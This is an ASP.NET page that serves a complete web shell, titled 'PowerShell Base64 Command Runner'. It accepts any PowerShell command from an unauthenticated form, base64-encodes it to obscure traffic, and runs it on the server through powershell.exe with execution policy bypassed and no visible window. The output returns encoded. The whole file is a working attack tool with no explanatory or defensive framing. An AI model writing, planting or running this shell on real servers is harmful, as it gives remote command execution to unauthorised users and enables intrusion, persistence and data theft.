<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>PowerShell Runner (Base64)</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #1e1e1e;
            color: #00ff00;
            padding: 40px;
        }
        #container {
            max-width: 800px;
            margin: auto;
            background: #2e2e2e;
            padding: 20px;
            border-radius: 10px;
        }
        textarea, input, button {
            width: 100%;
            margin-top: 10px;
        }
        textarea {
            height: 300px;
            background: black;
            color: #0f0;
            padding: 10px;
            border: none;
            resize: none;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
        }
    </style>
    <script>
        async function sendCommand(event) {
            event.preventDefault();
            const rawCommand = document.getElementById("pscommand").value;
            const encodedCommand = btoa(unescape(encodeURIComponent(rawCommand)));

            const formData = new FormData();
            formData.append("b64cmd", encodedCommand);

            const response = await fetch("", {
                method: "POST",
                body: formData
            });

            const base64Output = await response.text();
            const decoded = decodeURIComponent(escape(atob(base64Output)));
            document.getElementById("output").value = decoded;
        }
    </script>
</head>
<body>
    <div id="container">
        <h2>PowerShell Base64 Command Runner</h2>
        <form onsubmit="sendCommand(event)">
            <input type="text" id="pscommand" placeholder="Enter PowerShell command" />
            <button type="submit">Run</button>
        </form>
        <textarea id="output" readonly></textarea>
    </div>

<%
    if (IsPostBack && !string.IsNullOrEmpty(Request.Form["b64cmd"]))
    {
        try
        {
            string b64 = Request.Form["b64cmd"];
            string cmd = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));

            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + cmd.Replace("\"", "`\"") + "\"";
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                string full = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
                string responseBase64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(full));
                Response.Write(responseBase64);
                Response.End();
            }
        }
        catch (Exception ex)
        {
            string err = "Exception: " + ex.Message;
            string errEncoded = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(err));
            Response.Write(errEncoded);
            Response.End();
        }
    }
%>
</body>
</html>
